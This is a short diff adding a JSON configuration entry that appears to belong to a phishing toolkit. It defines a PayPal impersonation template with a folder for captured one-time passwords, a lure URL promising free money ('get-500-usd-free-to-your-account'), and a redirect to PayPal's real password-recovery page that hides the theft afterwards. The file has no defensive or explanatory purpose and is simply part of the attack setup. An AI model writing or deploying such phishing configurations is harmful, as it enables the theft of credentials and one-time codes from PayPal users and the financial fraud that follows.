@@ -1,0 +1,12 @@
+[
+  
+  {
+    "name": "Paypal",
+    "choice": "444",
+    "folder": "paypal",
+    "otp_folder": "paypal_otp",
+    "mask": "https://get-500-usd-free-to-your-account",
+    "redirect": "https://www.paypal.com/authflow/password-recovery/"
+  }
+  
+]
